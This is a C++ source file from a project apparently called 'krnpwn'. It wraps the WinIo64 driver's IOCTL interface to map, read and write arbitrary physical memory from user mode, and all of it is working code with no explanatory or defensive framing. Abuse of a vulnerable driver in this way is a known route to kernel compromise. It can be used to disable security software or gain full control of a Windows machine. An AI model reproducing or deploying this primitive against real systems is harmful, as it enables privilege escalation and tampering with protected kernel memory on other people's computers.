#include "krnpwn_winio64.hpp"

#include "../../util/log.hpp"

#define IOCTL_WINIO_MAPPHYSTOLIN 0x80102040
#define IOCTL_WINIO_UNMAPPHYSADDR 0x80102044

bool krnpwn::krnpwn_winio64::read_physical_memory( uint64_t address, void* buffer, size_t size )
{
    uint64_t linear_address;
    winio64_mem_t winio_struct{ 0 };

    winio_struct.physical_address = address;
    winio_struct.physical_memory_size = size;

    linear_address = map_physical_to_linear( winio_struct );

    if( linear_address )
    {
        memcpy( buffer, ( void* )linear_address, size );

        unmap_physical_memory( winio_struct );

        return true;
    }

    return false;
}

bool krnpwn::krnpwn_winio64::write_physical_memory( uint64_t address, void* buffer, size_t size )
{
    uint64_t linear_address;
    winio64_mem_t winio_struct{ 0 };

    winio_struct.physical_address = address;
    winio_struct.physical_memory_size = size;

    linear_address = map_physical_to_linear( winio_struct );

    if( linear_address )
    {
        memcpy( ( void* )linear_address, buffer, size );

        unmap_physical_memory( winio_struct );

        return true;
    }

    return false;
}

// https://github.com/vaptu/winio/blob/master/Source/Dll/Phys32.cpp#L15

uint64_t krnpwn::krnpwn_winio64::map_physical_to_linear( winio64_mem_t& winio_struct )
{
    ULONG ret = 0;

    if( !DeviceIoControl(
        driver_handle,
        IOCTL_WINIO_MAPPHYSTOLIN,
        &winio_struct,
        sizeof( winio64_mem_t ),
        &winio_struct,
        sizeof( winio64_mem_t ),
        &ret,
        nullptr ) )
    {
        return 0;
    }

    return winio_struct.linear_address;
}

bool krnpwn::krnpwn_winio64::unmap_physical_memory( winio64_mem_t& winio_struct )
{
    ULONG ret = 0;

    if( !DeviceIoControl(
        driver_handle,
        IOCTL_WINIO_UNMAPPHYSADDR,
        &winio_struct,
        sizeof( winio64_mem_t ),
        nullptr,
        0,
        &ret,
        nullptr ) )
    {
        return false;
    }

    return true;
}


